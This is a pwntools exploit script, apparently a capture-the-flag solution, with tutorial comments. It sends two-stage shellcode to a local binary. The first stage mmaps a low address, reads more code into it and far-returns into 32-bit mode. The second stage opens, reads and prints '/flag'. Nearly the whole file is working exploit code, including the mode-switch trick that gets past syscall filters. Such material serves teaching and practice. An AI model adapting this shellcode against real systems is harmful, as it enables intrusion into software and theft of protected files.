from pwn import *

p = process("./chal4")
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# You can check all Linux x64 syscalls at this page: https://syscalls64.paolostivanin.com/
# For this challenge, your task is removing redundant shellcodes and make it less than 0x10 bytes

# Tip 1: Some register have the correct values before running our shellcode! Let's use gdb to check the registers!

# Tip 2: The 0x10 bytes length limitation is too strict for execve("/bin/sh") because "/bin/sh" takes 8 bytes. \
# And why don't we call read rather than execve \
# so we could read longer shellcode to execute "/bin/sh" ?

# Tip 3: You may find x86 can't visite x64 address because x64 address is too long to be stored in the x86 register
# However, we still have mmap, which could allocate a chunk of memory, 
# for example 0xcafe000, so we can visite this address in x86 asm. 
context.arch = 'amd64'
shellcode = f'''
xor rax,rax
mov al,0x9
mov rdi,0xcafe0000
mov rsi,0x100
mov rdx,0x7
mov r10,0x21
xor r8,r8
xor r9,r9
syscall

xor rdi,rdi
mov rsi,rax
xor rdx,rdx
mov dl,0xff
xor rax,rax
syscall

mov rax,0x2300000000
xor rsi,rax
push rsi
retf
'''
gdb.attach(p)
shellcode = asm(shellcode)
p.send(shellcode.ljust(0x100,b'\0'))

context.arch='i386'
context.bits=32
flag_path_1 = hex(u32(b"/fla"))
flag_path_2 = hex(u32(b"g\0\0\0"))
shellcode=f'''
mov esp, 0xcafe0800
xor eax,eax
mov al,0x5
push {flag_path_2}
push {flag_path_1}
mov ebx,esp
xor ecx,ecx
xor edx,edx
int 0x80
mov ebx,eax
mov al,0x3
mov ecx,esp
mov dl,0xff
int 0x80
mov al,0x4
mov bl,0x1
int 0x80
'''
p.send(asm(shellcode))
p.interactive()